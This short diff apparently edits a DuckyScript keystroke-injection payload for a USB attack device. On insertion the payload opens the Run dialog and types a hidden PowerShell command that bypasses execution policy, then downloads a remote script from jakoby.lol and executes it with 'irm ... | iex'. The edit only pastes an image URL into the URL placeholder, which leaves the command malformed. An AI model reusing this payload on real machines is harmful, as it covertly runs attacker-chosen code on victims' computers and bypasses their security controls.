@@ -11,6 +11,6 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE';irm jakoby.lol/pkw | iex
+STRING powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE'https://www.lamborghini.com/sites/it-en/files/DAM/lamborghini/facelift_2019/model_detail/aventador/svj_roadster/2021/03_22/aventador_svj_r_overview1_m.jpg;irm jakoby.lol/pkw | iex
 DELAY 500
 ENTER
